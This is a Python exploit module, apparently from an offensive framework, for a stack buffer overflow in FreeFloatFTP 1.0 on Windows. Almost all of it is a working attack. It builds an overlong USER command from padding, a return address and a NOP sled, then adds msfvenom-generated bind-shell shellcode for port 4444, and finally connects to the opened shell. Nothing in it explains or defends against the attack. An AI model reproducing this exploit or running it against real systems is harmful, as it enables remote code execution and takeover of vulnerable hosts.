# coding:UTF-8
# Python 3.10.6
# shellcode由msfvenom生成

from resources import shell
import socket
from resources.base_module import BaseExploit
from resources.font import  print_error, print_success, print_info

class Exploit(BaseExploit):
    def __init__(self, host=None, port=21):
        super().__init__(host, port)
        self.info = {
            "Author": "Super hat",
            "Date": "2025-7-24",
            "Platform": "Windows",
            "Software and version": "FreeFloatFTP 1.0",
            "Description": "FreeFloatFTP1.0 software stack overflow vulnerability exploitation module"
        }

    def run(self):
        print_info("Target:{}:{}".format(self.host, self.port))
        # msfvenom -p windows/shell_bind_tcp RHOST=0.0.0.0 LPORT=4444 -b "\x00\x0a\x40\x0d" -f python
        buf = b""
        buf += b"\xb8\xd5\xa1\xb7\xd5\xdd\xc2\xd9\x74\x24\xf4\x5a"
        buf += b"\x2b\xc9\xb1\x53\x31\x42\x12\x83\xea\xfc\x03\x97"
        buf += b"\xaf\x55\x20\xeb\x58\x1b\xcb\x13\x99\x7c\x45\xf6"
        buf += b"\xa8\xbc\x31\x73\x9a\x0c\x31\xd1\x17\xe6\x17\xc1"
        buf += b"\xac\x8a\xbf\xe6\x05\x20\xe6\xc9\x96\x19\xda\x48"
        buf += b"\x15\x60\x0f\xaa\x24\xab\x42\xab\x61\xd6\xaf\xf9"
        buf += b"\x3a\x9c\x02\xed\x4f\xe8\x9e\x86\x1c\xfc\xa6\x7b"
        buf += b"\xd4\xff\x87\x2a\x6e\xa6\x07\xcd\xa3\xd2\x01\xd5"
        buf += b"\xa0\xdf\xd8\x6e\x12\xab\xda\xa6\x6a\x54\x70\x87"
        buf += b"\x42\xa7\x88\xc0\x65\x58\xff\x38\x96\xe5\xf8\xff"
        buf += b"\xe4\x31\x8c\x1b\x4e\xb1\x36\xc7\x6e\x16\xa0\x8c"
        buf += b"\x7d\xd3\xa6\xca\x61\xe2\x6b\x61\x9d\x6f\x8a\xa5"
        buf += b"\x17\x2b\xa9\x61\x73\xef\xd0\x30\xd9\x5e\xec\x22"
        buf += b"\x82\x3f\x48\x29\x2f\x2b\xe1\x70\x38\x98\xc8\x8a"
        buf += b"\xb8\xb6\x5b\xf9\x8a\x19\xf0\x95\xa6\xd2\xde\x62"
        buf += b"\xc8\xc8\xa7\xfc\x37\xf3\xd7\xd5\xf3\xa7\x87\x4d"
        buf += b"\xd5\xc7\x43\x8d\xda\x1d\xf9\x85\x7d\xce\x1c\x68"
        buf += b"\x3d\xbe\xa0\xc2\xd6\xd4\x2e\x3d\xc6\xd6\xe4\x56"
        buf += b"\x6f\x2b\x07\x49\x2c\xa2\xe1\x03\xdc\xe2\xba\xbb"
        buf += b"\x1e\xd1\x72\x5c\x60\x33\x2b\xca\x29\x55\xec\xf5"
        buf += b"\xa9\x73\x5a\x61\x22\x90\x5e\x90\x35\xbd\xf6\xc5"
        buf += b"\xa2\x4b\x97\xa4\x53\x4b\xb2\x5e\xf7\xde\x59\x9e"
        buf += b"\x7e\xc3\xf5\xc9\xd7\x35\x0c\x9f\xc5\x6c\xa6\xbd"
        buf += b"\x17\xe8\x81\x05\xcc\xc9\x0c\x84\x81\x76\x2b\x96"
        buf += b"\x5f\x76\x77\xc2\x0f\x21\x21\xbc\xe9\x9b\x83\x16"
        buf += b"\xa0\x70\x4a\xfe\x35\xbb\x4d\x78\x3a\x96\x3b\x64"
        buf += b"\x8b\x4f\x7a\x9b\x24\x18\x8a\xe4\x58\xb8\x75\x3f"
        buf += b"\xd9\xc8\x3f\x1d\x48\x41\xe6\xf4\xc8\x0c\x19\x23"
        buf += b"\x0e\x29\x9a\xc1\xef\xce\x82\xa0\xea\x8b\x04\x59"
        buf += b"\x87\x84\xe0\x5d\x34\xa4\x20"
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, int(self.port)))
            print_success("Successfully connected")
            # 构造恶意数据包
            data = b"USER " + b"\x41" * 230 + b"\xB3\x31\x5A\x7D" + b"\x90" * 20
            data += buf
            data += b"\r\n"
            sock.send(data)
            print_success("Successfully sent data")
            shell.open(self.host, 4444)
            sock.close()
        except BaseException as e:
            print_error(e)

    def options(self):
        super().options()

    def set(self, arg, value):
        super().set(arg, value)

    def show_info(self):
        super().show_info()

